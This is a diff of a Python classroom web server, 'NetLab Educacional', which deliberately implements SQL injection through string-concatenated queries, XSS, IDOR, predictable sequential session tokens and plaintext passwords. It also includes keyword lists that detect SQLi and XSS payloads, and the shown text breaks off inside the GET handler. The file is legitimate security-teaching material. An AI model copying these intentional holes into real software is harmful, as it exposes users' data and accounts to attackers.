@@ -1,723 +1,1536 @@
 # painel_servidor.py
-# Servidor HTTP educacional para demonstrações de segurança em sala de aula.
-# Exibe APENAS o modo vulnerável (sem criptografia de senha, sem bloqueio).
+# Servidor HTTP educacional vulneravel — NetLab Educacional
+#
+# AVISO DIDATICO:
+# Este servidor implementa vulnerabilidades web REAIS para demonstracao em sala de aula.
+# Escopo restrito ao banco de dados SQLite em memoria e a aplicacao web HTTP.
+# Nenhum acesso ao sistema operacional e realizado (sem subprocess, os.system, eval, exec).
+# Todos os dados sao descartados ao encerrar o servidor — sem persistencia em disco.
 
-import socket
+import json
+import sqlite3
 import threading
 import time
-import re
-from collections import defaultdict
 from datetime import datetime
 from http.server import HTTPServer, BaseHTTPRequestHandler
 from socketserver import ThreadingMixIn
-from typing import Optional, Callable
+from typing import Optional
 from urllib.parse import parse_qs
+import socket
 
 from PyQt6.QtWidgets import (
     QWidget, QVBoxLayout, QHBoxLayout, QLabel,
     QPushButton, QFrame, QTableWidget,
     QTableWidgetItem, QHeaderView, QSplitter,
-    QTextEdit, QCheckBox, QGroupBox, QGridLayout,
+    QTextEdit, QGroupBox, QGridLayout,
     QProgressBar
 )
 from PyQt6.QtCore import Qt, QTimer, pyqtSignal, QObject
 from PyQt6.QtGui import QFont, QColor
 
 
-# ─────────────────────────────────────────────────────────────────────────────
-# Sinais para comunicação thread-safe entre servidor e UI
-# ─────────────────────────────────────────────────────────────────────────────
+# ===========================================================================
+# Sinais Qt para comunicacao thread-safe entre servidor e interface grafica
+# ===========================================================================
 
 class SinaisServidor(QObject):
-    """Sinais emitidos pelo servidor HTTP para atualizar a interface."""
-    requisicao_recebida = pyqtSignal(dict)  # dados de cada requisição
-    status_alterado     = pyqtSignal(str)   # mensagem de status geral
-    alerta_emitido      = pyqtSignal(str)   # alerta didático educacional
+    """Sinais emitidos pelo servidor HTTP para atualizar a interface grafica."""
+    requisicao_recebida = pyqtSignal(dict)
+    status_alterado     = pyqtSignal(str)
+    alerta_emitido      = pyqtSignal(str)
 
 
 sinais_servidor = SinaisServidor()
 
 
-# ─────────────────────────────────────────────────────────────────────────────
-# Handler HTTP — modo vulnerável (sem proteções)
-# ─────────────────────────────────────────────────────────────────────────────
+# ===========================================================================
+# Banco de dados SQLite em memoria
+# ===========================================================================
 
-class HandlerLabEducacional(BaseHTTPRequestHandler):
+class BancoDadosServidor:
     """
-    Handler HTTP que registra todas as requisições e serve páginas didáticas.
+    Banco de dados SQLite completamente em memoria (':memory:').
 
-    Funciona APENAS no modo vulnerável:
-      - Senhas armazenadas e trafegadas em texto puro
-      - Sem bloqueio por falhas de login
-      - Sem rate limiting no login
-      - Ideal para demonstrar em sala de aula como capturas de pacotes
-        revelam credenciais quando HTTP é usado no lugar de HTTPS
+    - Dados criados ao iniciar o servidor e destruidos ao encerrar.
+    - Nenhum arquivo e gravado em disco.
+    - Thread-safe via lock interno.
+    - Oferece dois modos de execucao: vulneravel (sem parametrizacao)
+      e seguro (com parametrizacao), para fins didaticos.
     """
 
-    # ── Controle de volume de requisições (proteção didática contra DoS) ──
-    _contagem_por_ip:     dict = defaultdict(int)
-    _timestamps_por_ip:   dict = defaultdict(list)
-    _ips_bloqueados:      set  = set()
-    _ip_bloqueado_ate:    dict = {}
-    _limite_req_por_seg:  int  = 10   # 0 = sem limite
-    _tempo_bloqueio:      int  = 30   # segundos de bloqueio por volume
-    _protecao_ativa:      bool = False
-    _callback_requisicao: Optional[Callable] = None
-    _lock                = threading.Lock()
+    def __init__(self):
+        self._conexao: Optional[sqlite3.Connection] = None
+        self._lock = threading.Lock()
 
-    # ── Banco de usuários (texto puro — propositalmente vulnerável) ────────
-    _usuarios_vuln: dict = {"admin": "123456"}
+    @property
+    def ativo(self) -> bool:
+        """Retorna True se o banco esta em memoria e pronto para uso."""
+        return self._conexao is not None
 
-    # ─────────────────────────────────────────────────────────────────────
-    # Páginas HTML servidas pelo servidor educacional
-    # ─────────────────────────────────────────────────────────────────────
+    def inicializar(self):
+        """
+        Cria as tabelas e popula com dados de exemplo.
+        Chamado ao iniciar o servidor — recria tudo do zero.
+        """
+        self._conexao = sqlite3.connect(":memory:", check_same_thread=False)
+        cursor = self._conexao.cursor()
 
-    PAGINA_INICIAL = """<!DOCTYPE html>
-<html lang="pt-BR">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>NetLab — Servidor de Laboratório</title>
-    <style>
-        * { margin:0; padding:0; box-sizing:border-box; }
-        body {
-            font-family:'Segoe UI',Roboto,system-ui,sans-serif;
-            background:linear-gradient(145deg,#0a0f1e 0%,#0f1423 100%);
-            color:#e0e4f0; min-height:100vh;
-            display:flex; flex-direction:column;
-            align-items:center; padding:1.5rem;
-        }
-        h1 { font-size:clamp(1.8rem,6vw,2.5rem); color:#5a9eff;
-             margin-bottom:.25rem; font-weight:600; }
-        .subtitle { color:#7f8fa3; font-size:clamp(.9rem,4vw,1rem);
-                    margin-bottom:2rem; text-align:center; }
-        .nav { display:flex; flex-wrap:wrap; justify-content:center;
-               gap:.75rem; margin-bottom:2.5rem; max-width:600px; }
-        .nav a {
-            color:#cbd5e6; text-decoration:none;
-            padding:.6rem 1.2rem;
-            background:rgba(18,26,40,.8); border:1px solid #1e3a5f;
-            border-radius:40px; font-size:.95rem; font-weight:500;
-            transition:all .2s ease;
-        }
-        .nav a:hover { background:#1e3a5f; color:#fff; }
-        .card {
-            background:rgba(18,26,40,.9); border:1px solid #2a4a70;
-            border-radius:28px; padding:2rem 1.8rem;
-            max-width:600px; width:100%;
-            box-shadow:0 20px 40px -10px rgba(0,0,0,.7);
-        }
-        .card h2 { font-size:1.8rem; color:#3fe0a0; margin-bottom:1rem; }
-        .card p { line-height:1.6; margin-bottom:1.2rem; color:#b0c2d9; }
-        .info-footer {
-            color:#6f7e95; font-size:.85rem; text-align:center;
-            margin-top:1rem; border-top:1px solid #1e3a5f; padding-top:1.2rem;
-        }
-    </style>
-</head>
-<body>
-    <h1>🌐 NetLab</h1>
-    <div class="subtitle">Servidor educacional HTTP</div>
-    <div class="nav">
-        <a href="/">Início</a>
-        <a href="/login">Login</a>
-        <a href="/formulario">Formulário</a>
-    </div>
-    <div class="card">
-        <h2>✅ Servidor ativo</h2>
-        <p>Este ambiente simula um servidor web real para fins didáticos.
-           Todas as requisições são monitoradas em tempo real no painel do NetLab.</p>
-        <p>Utilize os links acima para gerar tráfego HTTP e visualize os dados
-           sendo capturados.</p>
-        <div class="info-footer">
-            Acesse de outros dispositivos usando o IP exibido no painel do NetLab.
-        </div>
-    </div>
-</body>
-</html>"""
+        # Tabela de usuarios — senhas em texto puro (vulnerabilidade intencional)
+        cursor.execute("""
+            CREATE TABLE users (
+                id       INTEGER PRIMARY KEY AUTOINCREMENT,
+                username TEXT    NOT NULL UNIQUE,
+                password TEXT    NOT NULL,
+                role     TEXT    DEFAULT 'user'
+            )
+        """)
 
-    PAGINA_FORMULARIO = """<!DOCTYPE html>
-<html lang="pt-BR">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Formulário — NetLab</title>
-    <style>
-        * { margin:0; padding:0; box-sizing:border-box; }
-        body {
-            font-family:'Segoe UI',Roboto,sans-serif;
-            background:linear-gradient(145deg,#0a0f1e 0%,#0f1423 100%);
-            color:#e0e4f0; min-height:100vh;
-            display:flex; align-items:center; justify-content:center; padding:1.5rem;
-        }
-        .card {
-            background:rgba(18,26,40,.95); border:1px solid #3b6ea0;
-            border-radius:36px; padding:2.5rem 2rem; max-width:520px; width:100%;
-            box-shadow:0 30px 50px -15px #0a1a2a;
-        }
-        h2 { color:#6ab0ff; font-size:2rem; font-weight:500;
-             margin-bottom:1.5rem; text-align:center; }
-        .aviso {
-            background:#1a2a3a; border:1px solid #e77; border-radius:40px;
-            padding:1rem; color:#ffbcbc; font-size:.9rem;
-            text-align:center; margin-bottom:2rem;
-        }
-        form { display:flex; flex-direction:column; gap:1.2rem; }
-        label { color:#a0b8d0; font-size:.85rem; font-weight:600;
-                margin-left:.5rem; margin-bottom:-.5rem; }
-        input {
-            width:100%; padding:1rem 1.2rem; border-radius:40px;
-            border:1px solid #2a4a70; background:#0d1a2a; color:#ecf0f1;
-            font-size:1rem;
-        }
-        button {
-            background:#2563EB; color:#fff; border:none; border-radius:40px;
-            padding:1rem; font-size:1.2rem; font-weight:600; cursor:pointer;
-            margin-top:.8rem;
-        }
-        button:hover { background:#3b82f6; }
-        .voltar { display:block; text-align:center; margin-top:1.8rem;
-                  color:#7f9fcf; text-decoration:none; font-size:.95rem; }
-    </style>
-</head>
-<body>
-    <div class="card">
-        <h2>📋 Formulário</h2>
-        <div class="aviso">⚠️ Dados enviados via HTTP — sem criptografia!</div>
-        <form method="POST" action="/formulario">
-            <label>Nome completo</label>
-            <input type="text" name="nome" placeholder="Nome">
-            <label>Telefone</label>
-            <input type="text" name="telefone" placeholder="(00) 00000-0000">
-            <label>Senha</label>
-            <input type="password" name="senha" placeholder="Sua senha">
-            <button type="submit">Enviar</button>
-        </form>
-        <a class="voltar" href="/">← Voltar ao início</a>
-    </div>
-</body>
-</html>"""
+        # Tabela de produtos
+        cursor.execute("""
+            CREATE TABLE products (
+                id    INTEGER PRIMARY KEY AUTOINCREMENT,
+                name  TEXT    NOT NULL,
+                price REAL    NOT NULL
+            )
+        """)
 
-    # ─────────────────────────────────────────────────────────────────────
-    # Configuração do servidor
-    # ─────────────────────────────────────────────────────────────────────
+        # Tabela de pedidos — relaciona usuarios e produtos
+        cursor.execute("""
+            CREATE TABLE orders (
+                id         INTEGER PRIMARY KEY AUTOINCREMENT,
+                user_id    INTEGER NOT NULL,
+                product_id INTEGER NOT NULL,
+                quantity   INTEGER NOT NULL DEFAULT 1
+            )
+        """)
 
-    @classmethod
-    def configurar_protecao(cls, ativar: bool, limite_req: int, tempo_bloqueio: int):
-        """Ajusta os limites de proteção contra sobrecarga (DoS educacional)."""
-        cls._protecao_ativa       = ativar
-        cls._limite_req_por_seg   = limite_req
-        cls._tempo_bloqueio       = tempo_bloqueio
-        cls._contagem_por_ip.clear()
-        cls._timestamps_por_ip.clear()
-        cls._ips_bloqueados.clear()
-        cls._ip_bloqueado_ate.clear()
+        # Tabela de comentarios — vulneravel a XSS armazenado
+        cursor.execute("""
+            CREATE TABLE comments (
+                id         INTEGER PRIMARY KEY AUTOINCREMENT,
+                author     TEXT,
+                content    TEXT NOT NULL,
+                created_at TEXT
+            )
+        """)
 
-    # ─────────────────────────────────────────────────────────────────────
-    # Handlers de requisição
-    # ─────────────────────────────────────────────────────────────────────
+        # Usuarios iniciais (senhas intencionalmente em texto puro)
+        cursor.executemany(
+            "INSERT INTO users (username, password, role) VALUES (?, ?, ?)",
+            [
+                ("admin",  "123456",   "admin"),
+                ("alice",  "alice123", "user"),
+                ("bob",    "bob456",   "user"),
+                ("carlos", "senha123", "user"),
+            ]
+        )
 
-    def do_GET(self):
-        """Serve as páginas HTML via GET e registra a requisição."""
-        inicio = time.time()
-        ip_cliente = self.client_address[0]
+        # Produtos iniciais
+        cursor.executemany(
+            "INSERT INTO products (name, price) VALUES (?, ?)",
+            [
+                ("Notebook Dell XPS 15",      4500.00),
+                ("Mouse Logitech MX Master",   320.00),
+                ("Teclado Mecanico RGB",        480.00),
+                ("Monitor LG 27 polegadas",    1800.00),
+                ("Headset Sony WH-1000XM5",    650.00),
+            ]
+        )
 
-        permitido, ttl, reqs_atual = self._verificar_limite(ip_cliente)
-        if not permitido:
-            self._servir_bloqueado()
-            self._registrar(ip_cliente, "GET", self.path, 0, inicio,
-                            bloqueado=True, reqs_por_seg=reqs_atual)
+        # Pedidos iniciais
+        cursor.executemany(
+            "INSERT INTO orders (user_id, product_id, quantity) VALUES (?, ?, ?)",
+            [
+                (1, 1, 2),
+                (2, 2, 1),
+                (2, 3, 3),
+                (3, 4, 1),
+                (1, 5, 2),
+            ]
+        )
+
+        # Comentarios iniciais (conteudo sera exibido sem escape — XSS armazenado)
+        cursor.executemany(
+            "INSERT INTO comments (author, content, created_at) VALUES (?, ?, ?)",
+            [
+                ("visitante", "Produto otimo, recomendo!",
+                 datetime.now().strftime("%H:%M:%S")),
+                ("alice", "Chegou rapido e em perfeito estado.",
+                 datetime.now().strftime("%H:%M:%S")),
+            ]
+        )
+
+        self._conexao.commit()
+
+    def encerrar(self):
+        """Fecha a conexao e descarta todos os dados da memoria."""
+        with self._lock:
+            if self._conexao:
+                self._conexao.close()
+                self._conexao = None
+
+    def consultar_vulneravel(self, query: str) -> tuple:
+        """
+        Executa SELECT por CONCATENACAO DIRETA de strings.
+
+        VULNERAVEL a SQL Injection — usada propositalmente para demonstracao.
+        Retorna (linhas, descricao_colunas, mensagem_erro_ou_None).
+        """
+        with self._lock:
+            try:
+                cursor = self._conexao.cursor()
+                cursor.execute(query)
+                return cursor.fetchall(), cursor.description, None
+            except sqlite3.Error as erro:
+                return [], None, str(erro)
+
+    def consultar_seguro(self, query: str, params: tuple = ()) -> tuple:
+        """
+        Executa SELECT com PARAMETRIZACAO — resistente a SQL Injection.
+        Retorna (linhas, descricao_colunas, mensagem_erro_ou_None).
+        """
+        with self._lock:
+            try:
+                cursor = self._conexao.cursor()
+                cursor.execute(query, params)
+                return cursor.fetchall(), cursor.description, None
+            except sqlite3.Error as erro:
+                return [], None, str(erro)
+
+    def modificar_vulneravel(self, query: str) -> tuple:
+        """
+        Executa INSERT/UPDATE/DELETE por CONCATENACAO DIRETA.
+
+        VULNERAVEL a SQL Injection — usada propositalmente.
+        Retorna (sucesso, mensagem_erro_ou_None).
+        """
+        with self._lock:
+            try:
+                cursor = self._conexao.cursor()
+                cursor.execute(query)
+                self._conexao.commit()
+                return True, None
+            except sqlite3.Error as erro:
+                return False, str(erro)
+
+    def modificar_seguro(self, query: str, params: tuple = ()) -> tuple:
+        """
+        Executa INSERT/UPDATE/DELETE com PARAMETRIZACAO.
+        Retorna (sucesso, mensagem_erro_ou_None).
+        """
+        with self._lock:
+            try:
+                cursor = self._conexao.cursor()
+                cursor.execute(query, params)
+                self._conexao.commit()
+                return True, None
+            except sqlite3.Error as erro:
+                return False, str(erro)
+
+
+# Instancia global — reinicializada a cada inicio do servidor
+banco_servidor = BancoDadosServidor()
+
+
+# ===========================================================================
+# Sessoes em memoria — propositalmente inseguras (tokens previsiveis)
+# ===========================================================================
+
+_sessoes_ativas: dict = {}          # {token: nome_usuario}
+_contador_sessao: int = 0           # Incrementado a cada login — previsivel (IDOR)
+_lock_sessoes = threading.Lock()
+
+
+def _criar_sessao(nome_usuario: str) -> str:
+    """
+    Cria uma sessao com token SEQUENCIAL e PREVISIVEL.
+    Demonstra vulnerabilidade de token adivinhavel (Session Prediction).
+    Ex: token1, token2, token3...
+    """
+    global _contador_sessao
+    with _lock_sessoes:
+        _contador_sessao += 1
+        token = f"token{_contador_sessao}"
+        _sessoes_ativas[token] = nome_usuario
+        return token
+
+
+def _usuario_da_sessao(cabecalho_cookie: str) -> str:
+    """Extrai o nome de usuario a partir do cookie de sessao."""
+    if not cabecalho_cookie:
+        return ""
+    for fragmento in cabecalho_cookie.split(";"):
+        fragmento = fragmento.strip()
+        if fragmento.startswith("sessao="):
+            token = fragmento[7:]
+            return _sessoes_ativas.get(token, "")
+    return ""
+
+
+def _remover_sessao(cabecalho_cookie: str):
+    """Invalida a sessao do usuario atual."""
+    if not cabecalho_cookie:
+        return
+    for fragmento in cabecalho_cookie.split(";"):
+        fragmento = fragmento.strip()
+        if fragmento.startswith("sessao="):
+            token = fragmento[7:]
+            with _lock_sessoes:
+                _sessoes_ativas.pop(token, None)
             return
 
-        if self.path == "/":
-            corpo = self.PAGINA_INICIAL.encode("utf-8")
-        elif self.path.startswith("/login"):
-            corpo = self._html_login(ip_cliente).encode("utf-8")
-        elif self.path.startswith("/signup"):
-            corpo = self._html_signup().encode("utf-8")
-        elif self.path == "/formulario":
-            corpo = self.PAGINA_FORMULARIO.encode("utf-8")
-        elif self.path == "/api/dados":
-            corpo = b'{"status":"ok","servidor":"NetLab","protocolo":"HTTP","criptografado":false}'
-            self.send_response(200)
-            self.send_header("Content-Type", "application/json; charset=utf-8")
-            self.send_header("Content-Length", str(len(corpo)))
-            self.end_headers()
-            self.wfile.write(corpo)
-            self._registrar(ip_cliente, "GET", self.path, len(corpo), inicio)
-            return
-        elif self.path == "/ping":
-            corpo = b'{"pong": true}'
-            self.send_response(200)
-            self.send_header("Content-Type", "application/json")
-            self.send_header("Content-Length", str(len(corpo)))
-            self.end_headers()
-            self.wfile.write(corpo)
-            self._registrar(ip_cliente, "GET", self.path, len(corpo), inicio)
-            return
-        else:
-            corpo = b"<h1>404 - Pagina nao encontrada</h1>"
-            self.send_response(404)
-            self.send_header("Content-Type", "text/html; charset=utf-8")
-            self.send_header("Content-Length", str(len(corpo)))
-            self.end_headers()
-            self.wfile.write(corpo)
-            self._registrar(ip_cliente, "GET", self.path, len(corpo), inicio)
-            return
 
-        self.send_response(200)
-        self.send_header("Content-Type", "text/html; charset=utf-8")
-        self.send_header("Content-Length", str(len(corpo)))
-        self.end_headers()
-        self.wfile.write(corpo)
-        self._registrar(ip_cliente, "GET", self.path, len(corpo), inicio)
+# ===========================================================================
+# Padroes para detecao de ataques (apenas para alertas didaticos — nao bloqueiam)
+# ===========================================================================
 
-    def do_POST(self):
-        """Processa requisições POST e registra os dados enviados."""
-        inicio     = time.time()
-        ip_cliente = self.client_address[0]
+_PADROES_SQLI = (
+    "union", "select", "drop", "insert", "delete", "update",
+    "' --", "'--", "or '1'='1", "1=1", "' or ", "' and ",
+    "/*", "*/", "xp_", "sleep(", "benchmark(",
+)
 
-        permitido, ttl, reqs_atual = self._verificar_limite(ip_cliente)
-        if not permitido:
-            self._servir_bloqueado()
-            self._registrar(ip_cliente, "POST", self.path, 0, inicio,
-                            bloqueado=True, reqs_por_seg=reqs_atual)
-            return
+_PADROES_XSS = (
+    "<script", "javascript:", "onerror=", "onload=", "alert(",
+    "document.cookie", "src=x", "<img", "<iframe",
+    "onfocus=", "onmouseover=", "eval(",
+)
 
-        tamanho     = int(self.headers.get("Content-Length", 0))
-        corpo_bytes = self.rfile.read(tamanho)
 
-        if self.path.startswith("/login"):
-            status, resposta, bloqueado = self._processar_login(corpo_bytes, ip_cliente)
-            self.send_response(status)
-            self.send_header("Content-Type", "text/html; charset=utf-8")
-            self.send_header("Content-Length", str(len(resposta)))
-            self.end_headers()
-            self.wfile.write(resposta)
-            self._registrar(ip_cliente, "POST", self.path, tamanho, inicio,
-                            corpo=corpo_bytes.decode("utf-8", errors="replace"),
-                            bloqueado=bloqueado)
-            return
+def _detectar_sqli(valor: str) -> bool:
+    """Verifica se o valor contem padroes de SQL Injection (apenas para alertas)."""
+    v = valor.lower()
+    return any(p in v for p in _PADROES_SQLI)
 
-        if self.path.startswith("/signup"):
-            status, resposta, bloqueado = self._processar_cadastro(corpo_bytes, ip_cliente)
-            self.send_response(status)
-            self.send_header("Content-Type", "text/html; charset=utf-8")
-            self.send_header("Content-Length", str(len(resposta)))
-            self.end_headers()
-            self.wfile.write(resposta)
-            self._registrar(ip_cliente, "POST", self.path, tamanho, inicio,
-                            corpo=corpo_bytes.decode("utf-8", errors="replace"),
-                            bloqueado=bloqueado)
-            return
 
-        # Formulário genérico
-        resposta = (
-            "<html><body style='background:#0f1423;color:#ecf0f1;"
-            "font-family:Arial;padding:40px;'>"
-            "<h2 style='color:#2ECC71;'>Dados recebidos pelo servidor!</h2>"
-            "<p>O NetLab capturou este envio em tempo real.</p>"
-            "<p style='color:#E74C3C;'>⚠️ Estes dados foram transmitidos "
-            "via HTTP — visíveis para qualquer capturador na rede.</p>"
-            "<a href='/' style='color:#3498DB;'>← Voltar</a>"
-            "</body></html>"
-        ).encode("utf-8")
+def _detectar_xss(valor: str) -> bool:
+    """Verifica se o valor contem padroes de XSS (apenas para alertas)."""
+    v = valor.lower()
+    return any(p in v for p in _PADROES_XSS)
 
-        self.send_response(200)
-        self.send_header("Content-Type", "text/html; charset=utf-8")
-        self.send_header("Content-Length", str(len(resposta)))
-        self.end_headers()
-        self.wfile.write(resposta)
-        self._registrar(ip_cliente, "POST", self.path, tamanho, inicio,
-                        corpo=corpo_bytes.decode("utf-8", errors="replace"))
 
-    # ─────────────────────────────────────────────────────────────────────
-    # Login — apenas modo vulnerável (sem hash, sem bloqueio)
-    # ─────────────────────────────────────────────────────────────────────
+# ===========================================================================
+# CSS compartilhado por todas as paginas do servidor
+# ===========================================================================
 
-    def _html_login(self, ip: str) -> str:
-        """Gera a página de login vulnerável com aviso didático visível."""
+_CSS_PAGINAS = """
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    body {
+        font-family: 'Segoe UI', Roboto, sans-serif;
+        background: #0a0f1e;
+        color: #e0e4f0;
+        min-height: 100vh;
+        padding: 20px;
+    }
+    nav {
+        background: #12162a;
+        border: 1px solid #1e2d40;
+        border-radius: 8px;
+        padding: 12px 20px;
+        margin-bottom: 24px;
+        display: flex;
+        gap: 10px;
+        flex-wrap: wrap;
+        align-items: center;
+    }
+    .titulo-nav {
+        color: #ecf0f1;
+        font-weight: bold;
+        font-size: 15px;
+        margin-right: 8px;
+    }
+    nav a {
+        color: #3498DB;
+        text-decoration: none;
+        font-size: 13px;
+        padding: 4px 10px;
+        border-radius: 4px;
+        transition: background 0.2s;
+    }
+    nav a:hover { background: #1e3a5f; }
+    .card {
+        background: #12162a;
+        border: 1px solid #1e2d40;
+        border-radius: 10px;
+        padding: 22px;
+        margin-bottom: 18px;
+    }
+    h1 { color: #3498DB; font-size: 20px; margin-bottom: 14px; }
+    h2 { color: #bdc3c7; font-size: 16px; margin-bottom: 10px; }
+    h3 { color: #7f8c8d; font-size: 13px; margin-bottom: 8px; }
+    .aviso {
+        background: #1a0000;
+        border-left: 4px solid #E74C3C;
+        padding: 10px 14px;
+        border-radius: 4px;
+        color: #ff8a8a;
+        font-size: 13px;
+        margin-bottom: 14px;
+    }
+    .info {
+        background: #001520;
+        border-left: 4px solid #3498DB;
+        padding: 10px 14px;
+        border-radius: 4px;
+        color: #7fbfdf;
+        font-size: 13px;
+        margin-bottom: 14px;
+    }
+    .sucesso {
+        background: #001a00;
+        border-left: 4px solid #2ECC71;
+        padding: 10px 14px;
+        border-radius: 4px;
+        color: #7fdf9f;
+        font-size: 13px;
+        margin-bottom: 14px;
+    }
+    form {
+        display: flex;
+        flex-direction: column;
+        gap: 10px;
+        max-width: 400px;
+    }
+    label { color: #7f8c8d; font-size: 12px; }
+    input[type=text], input[type=password], input[type=email], textarea {
+        background: #0d1a2a;
+        border: 1px solid #2a4a70;
+        border-radius: 6px;
+        color: #ecf0f1;
+        padding: 9px 13px;
+        font-size: 13px;
+        font-family: inherit;
+        width: 100%;
+    }
+    textarea { resize: vertical; min-height: 80px; }
+    button, input[type=submit] {
+        background: #1e3a5f;
+        color: #ecf0f1;
+        border: 1px solid #3498DB;
+        border-radius: 6px;
+        padding: 9px 20px;
+        font-size: 13px;
+        cursor: pointer;
+        transition: background 0.2s;
+    }
+    button:hover, input[type=submit]:hover { background: #2a5080; }
+    table {
+        width: 100%;
+        border-collapse: collapse;
+        font-size: 13px;
+    }
+    th {
+        background: #1e2d40;
+        color: #7f8c8d;
+        padding: 8px 12px;
+        text-align: left;
+        border-bottom: 1px solid #2a3a50;
+    }
+    td {
+        padding: 8px 12px;
+        border-bottom: 1px solid #1a2a3a;
+        color: #ecf0f1;
+    }
+    tr:hover { background: #0f1a2a; }
+    code {
+        background: #0a0f1a;
+        border: 1px solid #1e2d40;
+        border-radius: 4px;
+        padding: 2px 6px;
+        font-family: Consolas, monospace;
+        font-size: 12px;
+        color: #3498DB;
+    }
+    pre {
+        background: #0a0f1a;
+        border: 1px solid #1e2d40;
+        border-radius: 6px;
+        padding: 12px;
+        font-family: Consolas, monospace;
+        font-size: 12px;
+        color: #2ECC71;
+        overflow-x: auto;
+        white-space: pre-wrap;
+        word-break: break-all;
+    }
+    .badge {
+        display: inline-block;
+        border-radius: 4px;
+        padding: 2px 8px;
+        font-size: 11px;
+        font-weight: bold;
+    }
+    .badge-sqli  { background: #2a1500; color: #E67E22; border: 1px solid #E67E22; }
+    .badge-xss   { background: #002a1a; color: #27AE60; border: 1px solid #27AE60; }
+    .badge-idor  { background: #1a002a; color: #9B59B6; border: 1px solid #9B59B6; }
+    .badge-csrf  { background: #2a2a00; color: #F1C40F; border: 1px solid #F1C40F; }
+    .badge-brute { background: #1a1a2a; color: #95a5a6; border: 1px solid #95a5a6; }
+    .badge-info  { background: #001520; color: #3498DB; border: 1px solid #3498DB; }
+    a { color: #3498DB; text-decoration: none; }
+    a:hover { text-decoration: underline; }
+    .comentario-item {
+        border-bottom: 1px solid #1e2d40;
+        padding: 10px 0;
+    }
+    .comentario-autor {
+        color: #7f8c8d;
+        font-size: 11px;
+        margin-bottom: 4px;
+    }
+"""
+
+
+# ===========================================================================
+# Handler HTTP — todas as rotas e vulnerabilidades implementadas
+# ===========================================================================
+
+class HandlerVulneravel(BaseHTTPRequestHandler):
+    """
+    Handler HTTP com vulnerabilidades web reais para fins educacionais.
+
+    Vulnerabilidades implementadas (todas sempre ativas, sem configuracao):
+      - SQL Injection real em /login e /produtos (concatenacao direta)
+      - XSS refletido real em /busca e /perfil (sem escape HTML)
+      - XSS armazenado real em /comentarios (banco -> HTML sem escape)
+      - IDOR real em /pedidos (sem verificacao de autorizacao)
+      - Divulgacao de dados em /usuarios (senhas em texto puro sem autenticacao)
+      - CSRF em todos os formularios (sem tokens de protecao)
+      - Forca bruta em /login (sem limite de tentativas)
+      - Tokens de sessao previsiveis (sequenciais)
+      - Divulgacao de erro SQL (queries e erros do banco expostos ao usuario)
+    """
+
+    @staticmethod
+    def _pagina_base(titulo: str, conteudo: str) -> str:
+        """Gera a estrutura HTML base com navegacao e estilos compartilhados."""
         return f"""<!DOCTYPE html>
 <html lang="pt-BR">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Login — NetLab</title>
-  <style>
-    body {{
-      font-family:'Segoe UI',Roboto,system-ui,sans-serif;
-      background:linear-gradient(145deg,#0a0f1e 0%,#0f1423 100%);
-      color:#e0e4f0; display:flex; justify-content:center; align-items:center;
-      min-height:100vh; padding:16px;
-    }}
-    .card {{
-      background:rgba(18,26,40,.95); border:1px solid #c03c3c;
-      border-radius:28px; padding:28px 24px; max-width:440px; width:100%;
-      box-shadow:0 20px 40px -10px rgba(0,0,0,.7);
-    }}
-    h1 {{ margin:0 0 8px; color:#ff8a8a; font-size:24px; }}
-    .aviso {{
-      margin-bottom:12px; color:#e74c3c; font-weight:600; font-size:13px;
-      background:#2a1212; border:1px solid #b33; border-radius:8px;
-      padding:8px 12px;
-    }}
-    form {{ display:flex; flex-direction:column; gap:10px; margin-top:12px; }}
-    input {{ padding:10px 12px; border-radius:10px; border:1px solid #2a4a70;
-             background:#0f1423; color:#e0e4f0; font-size:1rem; }}
-    button {{ padding:12px; border:none; border-radius:12px;
-              background:#e74c3c; color:#0f1423; font-weight:700; cursor:pointer; }}
-    ul {{ color:#9fb2c8; font-size:13px; line-height:1.5; margin:8px 0 0 16px; }}
-    .ip {{ color:#7f8fa3; font-size:12px; margin-top:8px; }}
-  </style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>NetLab Vulneravel - {titulo}</title>
+    <style>{_CSS_PAGINAS}</style>
 </head>
 <body>
-  <div class="card">
-    <h1>Login educacional</h1>
-    <div class="aviso">
-      ⚠️ Modo vulnerável — senha em texto puro, sem proteção
-    </div>
-    <ul>
-      <li>Senha armazenada sem criptografia</li>
-      <li>Sem bloqueio por tentativas inválidas</li>
-      <li>Credenciais visíveis na captura de pacotes</li>
-    </ul>
-    <form method="POST" action="/login">
-      <input type="text" name="usuario" placeholder="Usuário" required>
-      <input type="password" name="senha" placeholder="Senha numérica">
-      <button type="submit">Entrar</button>
-    </form>
-    <div class="ip">Seu IP visto pelo servidor: {ip}</div>
-    <div style="margin-top:12px;">
-      <a style="color:#3498DB;" href="/signup">Criar conta</a>
-    </div>
-  </div>
+    <nav>
+        <span class="titulo-nav">NetLab Vulneravel</span>
+        <a href="/">Inicio</a>
+        <a href="/login">Login</a>
+        <a href="/produtos">Produtos</a>
+        <a href="/busca">Busca</a>
+        <a href="/comentarios">Comentarios</a>
+        <a href="/pedidos?id=1">Pedidos</a>
+        <a href="/usuarios">Usuarios</a>
+        <a href="/perfil?nome=visitante">Perfil</a>
+        <a href="/api/usuarios">API</a>
+    </nav>
+    {conteudo}
 </body>
 </html>"""
 
-    def _processar_login(self, corpo_bytes: bytes, ip: str):
-        """
-        Processa tentativa de login no modo vulnerável.
-        Compara senhas diretamente em texto puro — sem qualquer proteção.
-        Isso é intencional para fins educacionais: demonstra o perigo do HTTP.
-        """
-        dados   = parse_qs(corpo_bytes.decode("utf-8", errors="ignore"))
-        usuario = dados.get("usuario", [""])[0]
-        senha   = dados.get("senha",   [""])[0]
+    # -----------------------------------------------------------------------
+    # Roteamento de requisicoes GET
+    # -----------------------------------------------------------------------
 
-        senha_salva = self.__class__._usuarios_vuln.get(usuario, "")
-        login_ok    = bool(senha) and senha == senha_salva
+    def do_GET(self):
+        """Processa todas as requisicoes HTTP GET e roteia para os handlers."""
+        ts_inicio  = time.time()
+        ip_cliente = self.client_address[0]
+        cookies    = self.headers.get("Cookie", "")
+        usuario    = _usuario_da_sessao(cookies)
 
-        resposta = self._html_resposta_login(
-            sucesso=login_ok,
-            mensagem="" if login_ok else "Usuário ou senha incorretos."
-        )
-        return (200 if login_ok else 401), resposta, False
